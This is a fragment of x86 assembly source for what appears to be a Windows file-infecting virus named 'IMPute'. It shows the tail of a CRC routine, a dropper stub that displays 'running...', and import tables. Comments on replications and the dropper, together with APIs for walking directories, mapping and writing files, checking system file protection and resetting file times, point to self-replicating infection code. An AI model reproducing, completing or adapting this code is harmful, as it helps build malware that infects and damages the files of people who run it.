        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

;must be alphabetical order
;API names are not present in replications, only in dropper

krnnames        db      "CloseHandle"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileW"         , 0
                db      "FindClose"           , 0
                db      "FindFirstFileW"      , 0
                db      "FindNextFileW"       , 0
                db      "GetFullPathNameW"    , 0
                db      "GetTickCount"        , 0
                db      "GlobalAlloc"         , 0
                db      "GlobalFree"          , 0
                db      "LoadLibraryA"        , 0
                db      "MapViewOfFile"       , 0
                db      "SetCurrentDirectoryA", 0
                db      "SetCurrentDirectoryW", 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileTime"         , 0
                db      "UnmapViewOfFile"     , 0

sfcnames        db      "SfcIsFileProtected", 0

dllnames        db      "CloseHandle" , 0
                db      "CreateFileA" , 0
                db      "GetTickCount", 0
                db      "GlobalAlloc" , 0
                db      "GlobalFree"  , 0
                db      "WinExec"     , 0
                db      "WriteFile"   , 0

txttitle        db      "IMPute", 0
txtbody         db      "running...", 0

.code
                db      ?
end             dropper
